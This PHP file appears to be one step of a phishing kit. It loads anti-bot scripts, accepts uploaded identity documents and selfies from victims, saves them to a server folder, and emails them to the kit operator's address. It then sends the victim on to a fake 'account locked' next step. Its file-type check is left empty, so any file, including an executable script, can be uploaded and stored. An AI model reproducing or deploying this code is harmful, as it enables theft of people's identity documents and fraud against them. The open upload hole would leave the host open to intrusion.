<?php
error_reporting(0);
ini_set('display_errors', 0);

include('../blocker.php');
include('../detect.php');
include('../function.php');


if(isset($_FILES) && (bool) $_FILES) {
	$AllowedExtensions = ["pdf","doc","docx","gif","jpeg","jpg","png","rtf","txt"];
	$files = [];
	$server_file = [];
	foreach($_FILES as $name => $file) {
		$file_name = $file["name"];
		$file_temp = $file["tmp_name"];
		foreach($file_name as $key) {
			$path_parts = pathinfo($key);
			$extension = strtolower($path_parts["extension"]);
			if(!in_array($extension, $AllowedExtensions)) { 
					// echo "kosong";
			}
			$server_file[] = "../upload/{$path_parts["basename"]}";
		}
		for($i = 0; $i<count($file_temp); $i++) { move_uploaded_file($file_temp[$i], $server_file[$i]); }
	}
include('../settings.php');
$to = $pais_email;
$from = "ademaya2003@yandex.com"; 
$subject ="Selfie Photo's";
$message = "Document Selfie";
$headers = "From: Photo's Selfie <ademaya2003@yandex.com>";;
$semi_rand = md5(time());
$mime_boundary = "==Multipart_Boundary_x{$semi_rand}x";
$headers .= "\nMIME-Version: 1.0\n" . "Content-Type: multipart/mixed;\n" . " boundary=\"{$mime_boundary}\"";
$message = "This is a multi-part message in MIME format.\n\n" . "--{$mime_boundary}\n" . "Content-Type: hidden/plain; charset=\"iso-8859-1\"\n" . "Content-Transfer-Encoding: 7bit\n\n" . $message . "\n\n";
$message .= "--{$mime_boundary}\n";
$FfilenameCount = 0;
for($i = 0; $i<count($server_file); $i++) {
	$afile = fopen($server_file[$i],"rb");
	$data = fread($afile,filesize($server_file[$i]));
	fclose($afile);
	$data = chunk_split(base64_encode($data));
	$name = $file_name[$i];
	$message .= "Content-Type: {\"application/octet-stream\"};\n" . " name=\"$name\"\n" .
	"Content-Disposition: attachment;\n" . " filename=\"$name\"\n" .
	"Content-Transfer-Encoding: base64\n\n" . $data . "\n\n";
	$message .= "--{$mime_boundary}\n";
}
mail($to, $subject, $message, $headers);
	header("LOCATION: redirscr.php?locked=account_".$kode_negara."&login_params=checked&email_locked=".$_GET['email_locked']."&step=seven&time=".md5(gmdate('r')).sha1(gmdate('r')));
} 
?>